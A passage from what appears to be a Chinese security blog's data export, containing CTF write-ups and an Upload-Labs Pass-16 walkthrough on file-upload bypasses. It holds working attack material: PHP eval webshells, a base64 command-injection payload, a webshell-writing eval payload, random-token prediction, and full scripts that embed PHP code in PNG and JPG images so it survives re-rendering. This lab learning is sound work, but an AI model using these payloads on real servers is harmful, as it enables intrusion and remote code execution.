class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PYTHON</span><br><span class=\"line\">#coding=utf-8</span><br><span class=\"line\">import requests</span><br><span class=\"line\">import sys</span><br><span class=\"line\">def CompeteUpload():  #上传页面</span><br><span class=\"line\">    geturl=&quot;http://dmctf.vaala.cloud:28426/?file=php://filter/&lt;?php @eval($_POST[&#x27;a&#x27;]);?&gt;convert.base64-decode/resource=thx.log&quot;     #访问上传文件</span><br><span class=\"line\">    r1=requests.get(url=geturl)</span><br><span class=\"line\">if __name__==&quot;__main__&quot;:</span><br><span class=\"line\">    i=10;</span><br><span class=\"line\">    while (i&gt;0):</span><br><span class=\"line\">        i-=1;</span><br><span class=\"line\">        CompeteUpload();</span><br></pre></td></tr></table></figure>\n\n<p> 尝试访问<code>http://网址/sandbox/7e8c62b0ef1fa8de7542dd2272a4d021/thx.log</code>，会下载log文件，使用base64解码以后发现一句话木马存在，直接蚁剑连接：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CODE</span><br><span class=\"line\">http://网址?file=php://filter/convert.base64-decode/resource=thx.log</span><br></pre></td></tr></table></figure>\n\n<p>同样在根目录下找到flag。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129224231.png\" alt=\"img\"></p>\n<h2 id=\"do-you-have-a-right-token\"><a href=\"#do-you-have-a-right-token\" class=\"headerlink\" title=\"do_you_have_a_right_token\"></a>do_you_have_a_right_token</h2><p> F12查看网页代码，发现注释中一大段php代码估计就是题目用到的：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PHP</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">session_start();</span><br><span class=\"line\">include &#x27;flag.php&#x27;;</span><br><span class=\"line\">date_default_timezone_set(&#x27;Asia/Shanghai&#x27;);</span><br><span class=\"line\">if(isset($_POST[&#x27;token&#x27;]) &amp;&amp; isset($_SESSION[&#x27;token&#x27;]) &amp;&amp;!empty($_POST[&#x27;token&#x27;])&amp;&amp;!empty($_SESSION[&#x27;token&#x27;]))&#123;</span><br><span class=\"line\">    if($_POST[&#x27;token&#x27;]==$_SESSION[&#x27;token&#x27;])&#123;</span><br><span class=\"line\">        echo &quot;PassResetSuccess! Your Flag is:&quot;.$flag;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        echo &quot;Token_error!&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    mt_srand(time());</span><br><span class=\"line\"></span><br><span class=\"line\">    $rand= mt_rand();</span><br><span class=\"line\">    $_SESSION[&#x27;token&#x27;]=sha1(md5($rand));</span><br><span class=\"line\">    echo &quot;Token Generate Ok!&quot;;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">echo &#x27;&lt;form action=&quot;&quot; method=&quot;POST&quot;&gt;</span><br><span class=\"line\">    &lt;input type=&quot;text&quot; name=&quot;token&quot;&gt;</span><br><span class=\"line\">    &lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;</span><br><span class=\"line\">&lt;/form&gt;&#x27;;</span><br><span class=\"line\">echo &quot;&lt;!--\\r\\n&quot;.file_get_contents(__FILE__);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p> 分析一波：判断post请求中的<code>token</code>，如果不为空则与<code>$_SESSION[&#39;token&#39;]</code>判断是否相等，相等输出flag，再往下看12-16行，如果为空的话使用当前时间作为随机数的种子，生成一个随机数并进行md5和sha1函数加密并存入<code>$_SESSION[‘token’]</code>。</p>\n<p> 所以思路就是：<strong>我们需要知道生成的那个随机数的值</strong>，在网上搜到参考<a href=\"https://blog.csdn.net/zss192/article/details/104327432\">php伪随机数</a>，可以根据种子预测随机数。题目使用：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CODE</span><br><span class=\"line\">mt_srand(time());</span><br></pre></td></tr></table></figure>\n\n<p> 根据第4行设置时区时间并设置随机数种子，所以在本地环境使用相同方法尝试预测随机数，但是还需考虑到本地时间和题目服务器时间不同步问题，我想到的方法是借用之前题目获得的webshell上传php文件对本地时间进行校正：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PHP</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">date_default_timezone_set(&#x27;Asia/Shanghai&#x27;);</span><br><span class=\"line\">echo time();</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129211010.png\" alt=\"img\"></p>\n<p>计算时间差为69，所以修改代码跑一遍：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PHP</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">date_default_timezone_set(&#x27;Asia/Shanghai&#x27;);</span><br><span class=\"line\">// echo time()-69;  这是我验证时间用的</span><br><span class=\"line\">    mt_srand(time()-69);</span><br><span class=\"line\">    $rand = mt_rand();</span><br><span class=\"line\">    echo sha1(md5($rand));</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>提交本地运行后得到的密文提交上去就可以获得flag。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129211832.png\" alt=\"img\"></p>\n<h2 id=\"pingpingping\"><a href=\"#pingpingping\" class=\"headerlink\" title=\"pingpingping\"></a>pingpingping</h2><p> 进入以后是一个类似终端的界面，随便输几个指令提示：<strong>输入help获得提示</strong>，help以后又提示只能使用test和login，进入test以后提示输入url地址，所以这个才是符合题目的<code>pingpingping</code>，可以使用通道符<code>|</code>连接执行其他命令，搜索到了疑似本题的博客<a href=\"https://www.jianshu.com/p/fd7f9fcc9333\">GXYCTF–PingPingPing</a>，猜测flag很有可能还在根目录下，所以可以执行<code>cat /flag</code>输出，模仿博客中的构造方式把payload进行base64编码，使用sh执行命令，最终payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CODE</span><br><span class=\"line\">127.0.0.1|echo$IFS$1Y2F0IC9mbGFn|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure>\n\n<p>获得flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129230355.png\" alt=\"img\"></p>\n<h2 id=\"p3’webshell\"><a href=\"#p3’webshell\" class=\"headerlink\" title=\"p3’webshell\"></a>p3’webshell</h2><p> 提示给了一个链接：<a href=\"https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html\">一些不包含数字和字母的webshell</a>，看了以后确实受益匪浅收获很多，但是对于这个题目来说是一个烟雾弹。（更正，是我没看后面题，后面题用到了这个提示，这篇文章会继续更新。）</p>\n<p>源码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CODE</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">$command=$_POST[&#x27;command&#x27;];</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(!preg_match(&#x27;/\\&#x27;|&#123;|\\(|\\)|&#125;|\\$|_|=|1|\\+|;|\\./i&#x27;, $command))&#123;</span><br><span class=\"line\">    die(&quot;&lt;script&gt;alert(&#x27;?&#x27;)&lt;/script&gt;&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">eval($command);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>第4行使用正则表达式匹配<code>$command</code>字符串，但是前面有一个<code>!</code>取反，所以只要payload匹配到正则表达式即可绕过。post中请求：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CODE</span><br><span class=\"line\">command=fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[&#x27;a&#x27;]);?&gt;&#x27;);</span><br></pre></td></tr></table></figure>\n\n<p>使用蚁剑连接<code>http://网址/shell.php</code>，在根目录里找到flag。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129225225.png\" alt=\"img\"></p>\n"},{"title":"Upload-Labs之Pass-16","cover":"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201116224711.jpg","date":"2020-11-16T14:50:25.000Z","_content":"\n\n## 前言\n\n​\t我在这道题上花了快一天的时间，但是也学到了不少姿势，觉得东西应该足够多，而且参考了的博客发现这道题算是有歧义的，不知道作者想要考察的点是哪一个，所以算是有两种解法吧，可惜的是两种方法都不算是大成功，只有部分成功执行了。\n\n​\t参考博客：[upload-labs之pass 16详细分析](https://xz.aliyun.com/t/2657#toc-4)\n\n## Pass-16\n\n​\t源码（三种图片的判定，只贴一个吧，篇幅小一点）：\n\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])){\n    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径\n    $filename = $_FILES['upload_file']['name'];\n    $filetype = $_FILES['upload_file']['type'];\n    $tmpname = $_FILES['upload_file']['tmp_name'];\n\n    $target_path=UPLOAD_PATH.'/'.basename($filename);\n\n    // 获得上传文件的扩展名\n    $fileext= substr(strrchr($filename,\".\"),1);\n\n    //判断文件后缀与类型，合法才进行上传操作\n    if(($fileext == \"jpg\") && ($filetype==\"image/jpeg\")){\n        if(move_uploaded_file($tmpname,$target_path)){\n            //使用上传的图片生成新的图片\n            $im = imagecreatefromjpeg($target_path);\n\n            if($im == false){\n                $msg = \"该文件不是jpg格式的图片！\";\n                @unlink($target_path);\n            }else{\n                //给新图片指定文件名\n                srand(time());\n                $newfilename = strval(rand()).\".jpg\";\n                //显示二次渲染后的图片（使用用户上传图片生成的新图片）\n                $img_path = UPLOAD_PATH.'/'.$newfilename;\n                imagejpeg($im,$img_path);\n                @unlink($target_path);\n                $is_upload = true;\n            }\n        } else {\n            $msg = \"上传出错！\";\n        }\n\n    }else if(($fileext == \"png\") && ($filetype==\"image/png\")){\n        ......\n    }else if(($fileext == \"gif\") && ($filetype==\"image/gif\")){\n        .....\n    }else{\n        $msg = \"只允许上传后缀为.jpg|.png|.gif的图片文件！\";\n    }\n}\n```\n\n​\t提示：`本pass重新渲染了图片！`。说明对图片进行了二次渲染，我的理解就是把上传的图片，根据一些标准，只把图片中的图片信息提取出来，再生成一个图片，可以有效避免图片马。\n\n​\t首先是分析一波源码：\n\n​\t以jpg文件判定为例。获取文件名、类型、临时文件路径，获取文件后缀，进入jpg图片判定，判定的方式是通过文件后缀和文件的类型判定，再执行`move_uploaded_file`函数先把文件移动到`upload`文件夹，现在文件路径是`$target_path`，之后对图片进行二次渲染。\n\n​\t二次渲染用到了`imagecreatefromjpeg`函数，官方解释：由文件或 URL 创建一个新图象，返回一图像标识符，代表了从给定的文件名取得的图像（这时候图像对象还是一个空的）。然后判断是否是一个图片文件，如果不是的话执行`unlink`函数删除文件，否则，为新图片随机一个名称，执行`imagejpeg`函数把图象输出到新文件` $newfilename`。再将之前用户上传的文件`$target_path`删除掉。\n\n​\t根据上面的分析就能得出来两种思路：\n\n1. **访问二次渲染之前的上传的文件。**\n2. **在图片二次渲染以后图片马未失效。**\n\n\n\n## 第一种方法\n\n​\t（Linux环境、php版本7.2.21）\n\n​\t因为二次渲染那部分`if、else`无论如何都会执行`unlink`函数删除你的文件，需要在执行`imagecreatefromjpeg`时报错才能访问到自己原来上传的文件。\n\n### jpg格式\n\n#### 准备并上传\n\n​\t需要准备只含有一句话木马的文件并命名为.jpg格式。直接上传。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116200050.png)\n\n#### 文件包含验证\n\n​\t上传以后我使用的在线靶场网页中题目部分直接消失了，这就说明函数执行过程中出错导致页面也没有正常返回。然后就可以使用`inclue.php`文件包含访问刚刚上传的文件\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116200401.png)\t\n\n### 其他格式\n\n​\t如图成功访问就是图片马上传成功了。但是这个方法我只有`jpg`格式的文件上传成功了，另外两种格式的图片没有上传成功，这个我感觉需要了解`imagecreatefromjpeg`、`imagecreatefrompng`、`imagecreatefromgif`，这三个函数的原理，让其报错即可。\n\n\n\n## 第二种方法\n\n​\t（windows环境，php版本5.2.17）\n\n​\t这种方法是让图片码在经过二次渲染以后，能保证代码不会被二次渲染给过滤掉。从最简单的一个一个来。\n\n​\t用到的工具是**Beyond Compare 4**，是一个文件比较的工具，就是查看图片渲染修改的哪些部分，还可以查看文件的16进制格式。\n\n### GIF格式\n\n#### 准备并上传\n\n​\t上传一个使用`copy /b`指令制作的图片马，之前文章第13题用过。假设上传的图片马为**yoo.gif**，上传成功以后再下载下载的文件名为**2119840023.gif**。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116203245.png)\n\n#### \t文件比较\n\n​\t使用前面说的**Beyond Compare 4**工具进行比较，左边是渲染前的文件，右边是渲染后的文件，图片中白色的地方就是两个文件**相同**的地方，红色部分则是文件不同的地方。看的出来图片文件的前面一大部分二次渲染的时候都没有改变，所以我们可以直接将代码放在这一部分逃过二次渲染。`<?php phpinfo(); ?>`的十六进制是`3C 3F 70 68 70 20 70 68 70 69 6E 66 6F 28 29 3B 20 3F 3E`直接粘贴插入，在右边框中右键保存文件再进行上传。\n\n#### 文件包含验证\t\n\n​\t上传以后进行文件包含，代码执行成功。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116204104.png)\n\n​\t为了验证我们的想法，我们可以刚刚把上传的图片再下载下载，查看插入的代码是否逃过了二次渲染（废话执行成功了代码肯定在）。\n\n\n\n### png格式\n\n​\t这题自己原来打算模仿gif的方法修改图片，但是上传以后下载，对比文件十六进制不同的时候我傻了\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116204635.png)\n\n​\t这不同还是一段一段的，根本不可能模仿gif的方法，上面那一段相同的还是图片的**头标识**部分，修改的话就不是png格式图片，更过不了。\n\n​\t所以我直接看答案了，还是前言里的[博客](https://xz.aliyun.com/t/2657#toc-3)。png图片由3个以上的数据块组成，然后又分了图片基本信息、实际数据块、辅助数据块blablablabl，而且数据块中还有CRC码，学过计算机网络的都知道CRC码是验证错误的，自己随便插入代码以后不修改CRC码肯定是过不了的。\n\n​\t所以又出来了两种方法：\n\n1. 修改CRC码\n2. 直接生成图片\n\n#### 计算CRC码\n\n​\t计算CRC码的`python`脚本\n\n```\nimport binascii\nimport re\n\npng = open(r'1.png','rb')\na = png.read()\npng.close()\nhexstr = binascii.b2a_hex(a)\n\n''' PLTE crc '''\ndata =  '504c5445'+ re.findall('504c5445(.*?)49444154',hexstr)[0]\ncrc = binascii.crc32(data[:-16].decode('hex')) & 0xffffffff\nprint hex(crc)\n```\n\n##### 准备\n\n​\tphp底层在对PLTE数据块验证的时候,主要进行了CRC校验.所以可以在该部分**写入代码**，再重新计算CRC码，再修改原来的CRC码即可。\n\n##### \t计算CRC码\n\n​\t脚本会打开名为1.png的文件然后输出计算以后的CRC码结果。在把结果覆盖原来的CRC码上传图片就不会出错了。\n\n\n\n这个方法我没有尝试，因为我不会python。~~都2020年了还有人不会python，不会吧不会吧~~。😒\n\n等我学会在回来改这一篇吧。\n\n#### 直接生成图片（写入实际数据模块）\n\n​\t国外大牛的脚本，直接运行就会生成一个图片\n\n```\n<?php\n$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,\n           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,\n           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,\n           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,\n           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,\n           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,\n           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,\n           0x66, 0x44, 0x50, 0x33);\n\n\n\n$img = imagecreatetruecolor(32, 32);\n\nfor ($y = 0; $y < sizeof($p); $y += 3) {\n   $r = $p[$y];\n   $g = $p[$y+1];\n   $b = $p[$y+2];\n   $color = imagecolorallocate($img, $r, $g, $b);\n   imagesetpixel($img, round($y / 3), 0, $color);\n}\n\nimagepng($img,'./1.png');\n?>\n```\n\n​\tphp指令怎么执行？如果你本机有php环境，可以在php的根目录下找到一个名为`php.exe`的可执行文件，它是php提供的一种**CLI**模式，也就是**命令行模式**。我把php脚本放在了php的根目录，然后cmd切换到对应目录执行。\n\n​\t还有一种方法是借用本地搭建的靶机环境，把php放在目录使用浏览器访问一下即可。\n\n​\t运行成功以后会找到一个名为**1.png**的图片。这个就是生成的图片马了。可以尝试上传进行渲染以后下载到本地，使用文件比较验证。\n\n​\t但是这个生成的图片php代码是`<?=$_GET[0]($_POST[1]);?>`，应该是个一句话木马但是现在的我还不会用。源码也不知道怎么修改，总之图片渲染以后代码没有被去掉就算成功了吧，~~应该算吧~~\n\n### jpg格式\n\n​\t同样看答案。国外大牛写的脚本jpg_payload.php，可以向jpg图片里写入代码\n\n```php\n?php\n    /*\n\n    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().\n    It is necessary that the size and quality of the initial image are the same as those of the processed image.\n\n    1) Upload an arbitrary image via secured files upload script\n    2) Save the processed image and launch:\n    jpg_payload.php <jpg_name.jpg>\n\n    In case of successful injection you will get a specially crafted image, which should be uploaded again.\n\n    Since the most straightforward injection method is used, the following problems can occur:\n    1) After the second processing the injected data may become partially corrupted.\n    2) The jpg_payload.php script outputs \"Something's wrong\".\n    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.\n\n    Sergey Bobrov @Black2Fan.\n\n    See also:\n    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/\n\n    */\n\n    $miniPayload = \"<?=phpinfo();?>\";\n\n\n    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {\n        die('php-gd is not installed');\n    }\n\n    if(!isset($argv[1])) {\n        die('php jpg_payload.php <jpg_name.jpg>');\n    }\n\n    set_error_handler(\"custom_error_handler\");\n\n    for($pad = 0; $pad < 1024; $pad++) {\n        $nullbytePayloadSize = $pad;\n        $dis = new DataInputStream($argv[1]);\n        $outStream = file_get_contents($argv[1]);\n        $extraBytes = 0;\n        $correctImage = TRUE;\n\n        if($dis->readShort() != 0xFFD8) {\n            die('Incorrect SOI marker');\n        }\n\n        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {\n            $marker = $dis->readByte();\n            $size = $dis->readShort() - 2;\n            $dis->skip($size);\n            if($marker === 0xDA) {\n                $startPos = $dis->seek();\n                $outStreamTmp = \n                    substr($outStream, 0, $startPos) . \n                    $miniPayload . \n                    str_repeat(\"\\0\",$nullbytePayloadSize) . \n                    substr($outStream, $startPos);\n                checkImage('_'.$argv[1], $outStreamTmp, TRUE);\n                if($extraBytes !== 0) {\n                    while((!$dis->eof())) {\n                        if($dis->readByte() === 0xFF) {\n                            if($dis->readByte !== 0x00) {\n                                break;\n                            }\n                        }\n                    }\n                    $stopPos = $dis->seek() - 2;\n                    $imageStreamSize = $stopPos - $startPos;\n                    $outStream = \n                        substr($outStream, 0, $startPos) . \n                        $miniPayload . \n                        substr(\n                            str_repeat(\"\\0\",$nullbytePayloadSize).\n                                substr($outStream, $startPos, $imageStreamSize),\n                            0,\n                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . \n                                substr($outStream, $stopPos);\n                } elseif($correctImage) {\n                    $outStream = $outStreamTmp;\n                } else {\n                    break;\n                }\n                if(checkImage('payload_'.$argv[1], $outStream)) {\n                    die('Success!');\n                } else {\n                    break;\n                }\n            }\n        }\n    }\n    unlink('payload_'.$argv[1]);\n    die('Something\\'s wrong');\n\n    function checkImage($filename, $data, $unlink = FALSE) {\n        global $correctImage;\n        file_put_contents($filename, $data);\n        $correctImage = TRUE;\n        imagecreatefromjpeg($filename);\n        if($unlink)\n            unlink($filename);\n        return $correctImage;\n    }\n\n    function custom_error_handler($errno, $errstr, $errfile, $errline) {\n        global $extraBytes, $correctImage;\n        $correctImage = FALSE;\n        if(preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) {\n            if(isset($m[1])) {\n                $extraBytes = (int)$m[1];\n            }\n        }\n    }\n\n    class DataInputStream {\n        private $binData;\n        private $order;\n        private $size;\n\n        public function __construct($filename, $order = false, $fromString = false) {\n            $this->binData = '';\n            $this->order = $order;\n            if(!$fromString) {\n                if(!file_exists($filename) || !is_file($filename))\n                    die('File not exists ['.$filename.']');\n                $this->binData = file_get_contents($filename);\n            } else {\n                $this->binData = $filename;\n            }\n            $this->size = strlen($this->binData);\n        }\n\n        public function seek() {\n            return ($this->size - strlen($this->binData));\n        }\n\n        public function skip($skip) {\n            $this->binData = substr($this->binData, $skip);\n        }\n\n        public function readByte() {\n            if($this->eof()) {\n                die('End Of File');\n            }\n            $byte = substr($this->binData, 0, 1);\n            $this->binData = substr($this->binData, 1);\n            return ord($byte);\n        }\n\n        public function readShort() {\n            if(strlen($this->binData) < 2) {\n                die('End Of File');\n            }\n            $short = substr($this->binData, 0, 2);\n            $this->binData = substr($this->binData, 2);\n            if($this->order) {\n                $short = (ord($short[1]) << 8) + ord($short[0]);\n            } else {\n                $short = (ord($short[0]) << 8) + ord($short[1]);\n            }\n            return $short;\n        }\n\n        public function eof() {\n            return !$this->binData||(strlen($this->binData) === 0);\n        }\n    }\n?>\n```\n\n#### 准备\n\n​\t准备一个**yoo.jpg**图片，上传经过渲染以后再下载下到本地，保存为**1.jpg**。\n\n#### 插入代码\n\n​\t使用脚本处理**1.jpg**插入php代码，执行命令`php jpg_payload.php 1.jpg`。php命令执行方法上面有。执行成功以后应该如图所示：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116212640.png)\n\n​\t执行的目录下会多出一个名为`payload_1.jpg`的文件，这就是制作好的图片马。大佬的源码我是修改了一下的，可以修改上面的第25行代码，自定义插入想要的代码。\n\n#### 上传并验证\n\n​\t上传以后同样先确定图片的名称和地址，适用文件包含进行验证\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116215008.png)\n\n​\t如果如图所示，我们的图片马就上传成功了。**需要提醒：有些图片不行可能需要多换几个图片试一试！！！**\n\n呼，终于可以休息了。\n\n\n\n\n\n","source":"_posts/Upload-Labs4.md","raw":"---\ntitle: Upload-Labs之Pass-16\ncategories:\n- DROPS\ntags:\n- 文件上传漏洞\ncover: 'https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201116224711.jpg'\ndate: 2020-11-16 22:50:25\n---\n\n\n## 前言\n\n​\t我在这道题上花了快一天的时间，但是也学到了不少姿势，觉得东西应该足够多，而且参考了的博客发现这道题算是有歧义的，不知道作者想要考察的点是哪一个，所以算是有两种解法吧，可惜的是两种方法都不算是大成功，只有部分成功执行了。\n\n​\t参考博客：[upload-labs之pass 16详细分析](https://xz.aliyun.com/t/2657#toc-4)\n\n## Pass-16\n\n​\t源码（三种图片的判定，只贴一个吧，篇幅小一点）：\n\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])){\n    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径\n    $filename = $_FILES['upload_file']['name'];\n    $filetype = $_FILES['upload_file']['type'];\n    $tmpname = $_FILES['upload_file']['tmp_name'];\n\n    $target_path=UPLOAD_PATH.'/'.basename($filename);\n\n    // 获得上传文件的扩展名\n    $fileext= substr(strrchr($filename,\".\"),1);\n\n    //判断文件后缀与类型，合法才进行上传操作\n    if(($fileext == \"jpg\") && ($filetype==\"image/jpeg\")){\n        if(move_uploaded_file($tmpname,$target_path)){\n            //使用上传的图片生成新的图片\n            $im = imagecreatefromjpeg($target_path);\n\n            if($im == false){\n                $msg = \"该文件不是jpg格式的图片！\";\n                @unlink($target_path);\n            }else{\n                //给新图片指定文件名\n                srand(time());\n                $newfilename = strval(rand()).\".jpg\";\n                //显示二次渲染后的图片（使用用户上传图片生成的新图片）\n                $img_path = UPLOAD_PATH.'/'.$newfilename;\n                imagejpeg($im,$img_path);\n                @unlink($target_path);\n                $is_upload = true;\n            }\n        } else {\n            $msg = \"上传出错！\";\n        }\n\n    }else if(($fileext == \"png\") && ($filetype==\"image/png\")){\n        ......\n    }else if(($fileext == \"gif\") && ($filetype==\"image/gif\")){\n        .....\n    }else{\n        $msg = \"只允许上传后缀为.jpg|.png|.gif的图片文件！\";\n    }\n}\n```\n\n​\t提示：`本pass重新渲染了图片！`。说明对图片进行了二次渲染，我的理解就是把上传的图片，根据一些标准，只把图片中的图片信息提取出来，再生成一个图片，可以有效避免图片马。\n\n​\t首先是分析一波源码：\n\n​\t以jpg文件判定为例。获取文件名、类型、临时文件路径，获取文件后缀，进入jpg图片判定，判定的方式是通过文件后缀和文件的类型判定，再执行`move_uploaded_file`函数先把文件移动到`upload`文件夹，现在文件路径是`$target_path`，之后对图片进行二次渲染。\n\n​\t二次渲染用到了`imagecreatefromjpeg`函数，官方解释：由文件或 URL 创建一个新图象，返回一图像标识符，代表了从给定的文件名取得的图像（这时候图像对象还是一个空的）。然后判断是否是一个图片文件，如果不是的话执行`unlink`函数删除文件，否则，为新图片随机一个名称，执行`imagejpeg`函数把图象输出到新文件` $newfilename`。再将之前用户上传的文件`$target_path`删除掉。\n\n​\t根据上面的分析就能得出来两种思路：\n\n1. **访问二次渲染之前的上传的文件。**\n2. **在图片二次渲染以后图片马未失效。**\n\n\n\n## 第一种方法\n\n​\t（Linux环境、php版本7.2.21）\n\n​\t因为二次渲染那部分`if、else`无论如何都会执行`unlink`函数删除你的文件，需要在执行`imagecreatefromjpeg`时报错才能访问到自己原来上传的文件。\n\n### jpg格式\n\n#### 准备并上传\n\n​\t需要准备只含有一句话木马的文件并命名为.jpg格式。直接上传。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116200050.png)\n\n#### 文件包含验证\n\n​\t上传以后我使用的在线靶场网页中题目部分直接消失了，这就说明函数执行过程中出错导致页面也没有正常返回。然后就可以使用`inclue.php`文件包含访问刚刚上传的文件\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116200401.png)\t\n\n### 其他格式\n\n​\t如图成功访问就是图片马上传成功了。但是这个方法我只有`jpg`格式的文件上传成功了，另外两种格式的图片没有上传成功，这个我感觉需要了解`imagecreatefromjpeg`、`imagecreatefrompng`、`imagecreatefromgif`，这三个函数的原理，让其报错即可。\n\n\n\n## 第二种方法\n\n​\t（windows环境，php版本5.2.17）\n\n​\t这种方法是让图片码在经过二次渲染以后，能保证代码不会被二次渲染给过滤掉。从最简单的一个一个来。\n\n​\t用到的工具是**Beyond Compare 4**，是一个文件比较的工具，就是查看图片渲染修改的哪些部分，还可以查看文件的16进制格式。\n\n### GIF格式\n\n#### 准备并上传\n\n​\t上传一个使用`copy /b`指令制作的图片马，之前文章第13题用过。假设上传的图片马为**yoo.gif**，上传成功以后再下载下载的文件名为**2119840023.gif**。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116203245.png)\n\n#### \t文件比较\n\n​\t使用前面说的**Beyond Compare 